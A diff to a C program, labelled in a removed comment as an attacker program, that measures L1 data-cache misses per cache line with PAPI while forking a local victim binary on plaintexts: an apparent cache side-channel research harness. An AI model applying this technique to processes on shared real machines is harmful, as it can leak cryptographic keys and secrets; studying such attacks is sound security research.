@@ -1,13 +1,4 @@
-/* 
-atk.c
 
-DESCRIPTION:
-    Attacker program that takes PAPI_L1_DCM event information for each
-    L1 line.
-    These information allows the attacker to plot and discover the line that is being accessed
-    by victims.
-
-*/
 
 #define _GNU_SOURCE              
 
@@ -22,14 +13,16 @@ DESCRIPTION:
 #include <string.h>
 #include <time.h>
 
+
+#define WAIT_TIME 15000
 #define N_MEAS 500
 #define LOGICAL_CORE 3              // logical core where this process will run on
 #define SIZE32KB (32*1024)          //  represents 32 KB
 #define W 8                         //  associativity number of L1
 #define STRIDE (SIZE32KB/W)         //  step distance between the consecutive accesses in order to fill a particular line of L1
 #define ATTACKER_DISTANCE 64        //  bytes space between each attacker thread [block size=64]
-#define REPETITIONS 32            //  number of times the whole measurement process is repeated
-#define INNER_REPETITIONS 10000    // number of times a measurement of a given L1 line is performed
+#define REPETITIONS 32              //  number of times the whole measurement process is repeated
+#define INNER_REPETITIONS 10000     // number of times a measurement of a given L1 line is performed
 
 void cpu_setup();
 void get_plaintext(char * plaintext);
@@ -42,8 +35,11 @@ char V[SIZE32KB];
 
 int main(void) { 
 
+    // make this process run on hw thread 3
     cpu_setup();
-    srand(time(NULL));   // configures random function
+
+    // configures random function
+    srand(time(NULL));   
 
     FILE* logfile;
     register int line;
@@ -52,7 +48,7 @@ int main(void) {
     register int ii;                        
     register int v_line = L1_line_translator(V);
 
-    char plaintext[16*(3+1)+1];   //change to malloc() if it gives problem
+    char plaintext[16*(3+1)+1];
     char * args[3]; // should be char * const instead, check this
     int pid  = 0;
     char file_name[35];
@@ -63,9 +59,8 @@ int main(void) {
     long_long start_cycles, end_cycles, start_usec, end_usec;
     float avgMISSES;
     float avgTIME;
-    int a;
 
-
+    // Papi configuration
     retval = PAPI_library_init(PAPI_VER_CURRENT);
     if (retval != PAPI_VER_CURRENT) {
         fprintf(stderr, "PAPI library init error!\n");
@@ -79,30 +74,27 @@ int main(void) {
         handle_error(1,"add_event");
 
 
-    
-
-
+    // Measurement loop
     for(int j = 0; j < N_MEAS ; j++){    
 
 
         snprintf(file_name, sizeof(file_name), "side_channel_info/meas#%i.out",j);
         logfile = fopen(file_name,"w");
         get_plaintext(plaintext);
-        // fprintf(logfile,"plaintext: %s\n", plaintext);
 
-        // printf("plaintext: %s\n", plaintext);
 
         fprintf(logfile,"%s\n", plaintext);
         args[0] = "./vic";
         args[1] = plaintext;
         args[2] =  NULL;
 
+        // fork & creation of a victim
         if ( (pid = fork())== 0) {
             execv("./vic", args);
         }
 
-        // waits for vic.c configuration
-        usleep(2000);
+        // waiting for victim configuration
+        usleep(WAIT_TIME);
 
 
         for ( min=0 ; min<SIZE32KB/W ; min+=ATTACKER_DISTANCE) { 
@@ -114,7 +106,6 @@ int main(void) {
                 if (PAPI_start(EventSet) != PAPI_OK)
                     handle_error(1,"start");
         
-                
                 // ----------------------------------------------
                 for (ii = 0; ii < INNER_REPETITIONS ; ii++) {
                     for(i = min; i < SIZE32KB; i+= STRIDE)
@@ -131,6 +122,7 @@ int main(void) {
 
         fclose(logfile);
 
+        // wait for victim
         wait(NULL);// or kill(child_pid, SIGKILL);
 
 
@@ -138,7 +130,6 @@ int main(void) {
 
     return 0;
 }
-
 
 
 void get_plaintext(char * plaintext){
